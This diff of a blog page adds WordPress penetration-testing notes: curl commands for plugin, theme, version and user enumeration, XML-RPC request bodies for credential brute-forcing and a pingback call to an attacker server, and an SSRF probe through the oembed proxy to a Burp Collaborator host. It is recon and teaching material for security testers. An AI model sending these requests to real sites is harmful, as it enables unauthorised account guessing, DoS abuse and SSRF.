@@ -769,11 +769,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 467 |
+            <i class="fas fa-file-text-o"></i> 字数统计: 749 |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 2分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 4分钟 |
           </span>
   
           
@@ -820,7 +820,7 @@
 <p><code>wp-content/uploads/</code> Is the directory where any files uploaded to the platform are stored.</p>
 <p><code>wp-includes/</code> This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</p>
 <p>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.</p>
-<pre class="line-numbers language-none"><code class="language-none">Get Plugins
+<h3 id="Passive-enumeration"><a href="#Passive-enumeration" class="headerlink" title="Passive enumeration"></a>Passive enumeration</h3><pre class="line-numbers language-none"><code class="language-none">Get Plugins
 curl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;plugins&#x2F;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2
 
 Get Themes
@@ -829,6 +829,35 @@ curl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pa
 Extract versions in general
 curl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep http | grep -E &#39;?ver&#x3D;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="Active-enumeration"><a href="#Active-enumeration" class="headerlink" title="Active enumeration"></a>Active enumeration</h3><h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><pre class="line-numbers language-none"><code class="language-none">curl -s -I -X GET http:&#x2F;&#x2F;blog.example.com&#x2F;?author&#x3D;1
+curl http:&#x2F;&#x2F;blog.example.com&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h4><p>If <code>xml-rpc.php</code> is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process<a target="_blank" rel="noopener" href="https://github.com/relarizky/wpxploit"> using this</a> for example).</p>
+<p>To see if it is active try to access to <strong><code>/xmlrpc.php</code></strong> and send(POST) this request:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;methodCall&gt;
+&lt;methodName&gt;system.listMethods&lt;&#x2F;methodName&gt;
+&lt;params&gt;&lt;&#x2F;params&gt;
+&lt;&#x2F;methodCall&gt;
+
+&lt;methodCall&gt;
+&lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;
+&lt;params&gt;
+&lt;param&gt;&lt;value&gt;admin&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;
+&lt;param&gt;&lt;value&gt;pass&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;
+&lt;&#x2F;params&gt;
+&lt;&#x2F;methodCall&gt;
+
+&lt;methodCall&gt;
+&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;
+&lt;params&gt;&lt;param&gt;
+&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;
+&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;
+&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;
+&lt;&#x2F;methodCall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF"><a href="#x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF" class="headerlink" title="&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF"></a>&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF</h3><p>Try to access <em><code>https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net</code></em> and the Worpress site may make a request to you.</p>
 
       </div>
       <div class="post-tags-categories">
